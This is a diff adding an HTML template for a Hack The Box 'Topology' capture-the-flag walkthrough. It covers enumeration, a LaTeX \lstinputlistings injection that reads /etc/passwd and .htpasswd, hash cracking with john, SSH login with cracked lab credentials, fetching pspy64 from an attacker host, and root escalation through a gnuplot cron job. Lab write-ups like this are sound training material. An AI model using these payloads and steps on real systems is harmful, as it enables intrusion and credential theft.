@@ -1,0 +1,146 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB topology</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+
+</head>
+<body>
+    <h1 class="title">HTB Toplogoly</h1>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>sudo nmap -p- -sCV IP --min-rate=2000 > nmap.txt</code></pre></div>
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/1-nmap.png' %}" alt="">
+        <p class="text">Basic outputs. HTTP and SSH are opened, so the main place we work is HTTP. <br></p>
+    </div>
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/2-webpage.png' %}" alt="">
+        <p class="text">
+            This page doesn't have any functionality which we can exploit. Even the button and href are not working. So, it must have other page to explore. <br><br>
+            Since there is no buttons and hrefs that redirect us, gobuster may not provide us interesting information. Therefore, we start from developer tools.
+        </p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/3-subdomain.png' %}" alt="">
+        <p class="text">On the inspector tool, search 'topology' and it tells me there is a subdomain 'latex.topology.htb'. Let's add to /etc/hosts and observe the page.</p>
+    </div>
+
+    <div class="code-box"><pre><code>echo 'IP latex.topology.htb' | sudo tee -a /etc/hosts</code></pre></div>
+
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/4-latex-page.png' %}" alt="">
+        <p class="text">On the latex.topology.hbt, there are several files are exposed. We would exploit some of them.</p>
+    </div>
+
+
+    <h2 class="subtitle">Hoothold</h2>
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/5-equation.png' %}" alt="">
+        <p class="text">On this page, the characters we type on the input field are converted into mathematical notation. Since there is user input, and some function modify the input, it is probably vulnerable.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/7-header-tex.png' %}" alt="">
+        <p class="text">Additionally, there is interesting information on the header.tex file. <br><br>
+            <u>\usepackage{listings}</u> : include source code files or print inline code. <br>
+        If we could exploit this, we can cause LFI.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/8-listing.png' %}" alt="">
+        <p class="text">On the man-page, we can use <u>\lstinputlistings</u> to include external files. Since the function is activated in header.tex file, we can exploit this.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/9-dollar.png' %}" alt="">
+        <p class="text">Fortunately, there is an example how is the mathematical notation set. This tells us we can indicate argument with $.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/10-first-injection.png' %}" alt="">
+        <p class="text">This injection code <u>$\lstinputlistings{/etc/passwd}$</u> would show us the file.</p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/11-passwd.png' %}" alt="">
+        <p class="text">
+            As expected, we could cause LFI and see /etc/passwd. <br><br>
+            To make sure if there is other subdomain, let's take a look at <u>/etc/apache2/sites-available/000-default.conf</u>, where include configuration file.
+        </p>
+    </div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/12-LFI.png' %}" alt="">
+        <p class="text">Here, we found new subdomains 'dev' and 'stats'. Since 'dev' sounds more important, we start from it.</p>
+    </div>
+
+    <div class="code-box">
+        <pre><code>echo 'IP dev.topology.htb' | sudo tee -a /etc/hosts</code></pre>
+    </div>
+
+    <p class="text">When we open the page, a prompt appears. This page may contain password hash to check if the user is developer.</p>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/topology/13-passwd-LFI.png' %}" alt="">
+        <p class="text">Back to the equation.php, and include <u>/var/www/dev/.htpasswd</u>. We can get hashed password and username easily.</p>
+    </div>
+
+    <div class="code-box"><pre><code>echo 'OUTPUT_FROM_LFI' > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre></div>
+
+        <div class="img">
+            <img src="{% static 'EthHack/images/topology/14-get-pass.png' %}" alt="">
+            <p class="text">
+                We could get username : vdaisly and password : calculus20. <br><br>
+                Though we can access to the dev page using this credentials, it's common to reuse the credential in local machine. So, let's try ssh.
+            </p>
+        </div>
+
+        <div class="code-box">
+            <pre><code>ssh vdaisly@IP</code></pre>
+        </div>
+
+        <div class="img">
+            <img src="{% static 'EthHack/images/topology/15-ssh.png' %}" alt="">
+            <p class="text">Fortunately, the developer reuse credential, and we could establish SSH connectino easily. <br><br>
+            However, even if we try the code 'sudo -l' and 'netstat -tulnp', there is no sudo privilege and local open port. Therefore, we should check cronjob which we can exploit.</p>
+        </div>
+
+        <h2 class="subtitle">Privilege Escalation</h2>
+        <p class="text">To see if there is cronjob, we use pspy64. At first download pspy64 from github on your local machine. Then install pspy64 using wget function.</p>
+        <div class="code-box">
+            <pre><code>python3 -m http.server 4444 #on local machine, make sure you execute this code where pspy64 installed.
+cd tmp # on the remote machine
+wget http://YOUR_IP:4444/pspy64
+chmod +x pspy64 
+./pspy64</code></pre>
+        </div>
+        <div class="img">
+            <img src="{% static 'EthHack/images/topology/16-pspy.png' %}" alt="">
+            <p class="text">Open another ssh since pspy64 dominate current ssh connection. <br>
+            Waiting little, we can observe cronjob which check if there is .plt file, and execute them immediately.</p>
+        </div>
+
+        <div class="img">
+            <img src="{% static 'EthHack/images/topology/17-crontab.png' %}" alt="">
+            <p class="text">On the second line, it looks for the file whose file extention is .plt. <br>
+            On the third line, execute them with gnuplot. Therefore, if we write a plt file on the /opt/gnuplot with gnuplot code, we can execute any shell code with root privilege. <br><br>
+            <a href="http://gnuplot.info/docs_5.5/Commands.html">Here is gnuplot command page</a> <br><br>
+
+        Read this and let's try exploitation.</p>
+        </div>
+
+        <div class="img">
+            <img src="{% static 'EthHack/images/topology/18-made-plt.png' %}" alt="">
+            <p class="text">We can create reverse shell code, but it's easier to cat root text directly. <br>
+            Wait just 1min, and gnuplot writes root file into /tmp/output.txt.</p>
+        </div>
+
+</body>
+</html>
